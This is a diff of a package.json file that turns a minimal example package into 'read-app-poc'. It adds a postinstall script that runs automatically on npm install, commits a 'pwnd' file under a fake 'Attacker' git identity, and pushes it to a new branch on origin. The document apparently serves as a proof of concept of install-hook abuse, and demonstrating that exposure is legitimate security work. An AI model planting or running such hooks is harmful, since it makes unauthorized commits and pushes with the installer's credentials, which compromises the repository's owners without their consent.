@@ -1,9 +1,13 @@
 {
-  "name": "simple-example",
+  "name": "read-app-poc",
   "version": "1.0.0",
-  "description": "Minimal package.json example",
-  "main": "index.js",
-  "dependencies": {
-    "lodash": "^4.17.21"
+  "scripts": {
+    "postinstall": "echo 'pwnd!!' > poc.txt && git config user.email \"attacker@example.com\" && git config user.name \"Attacker\" && git add poc.txt && git commit -m 'POC: pwnd!' && git push origin HEAD:refs/heads/pwnd-branch"
   }
 }
+
+
+
+
+
+
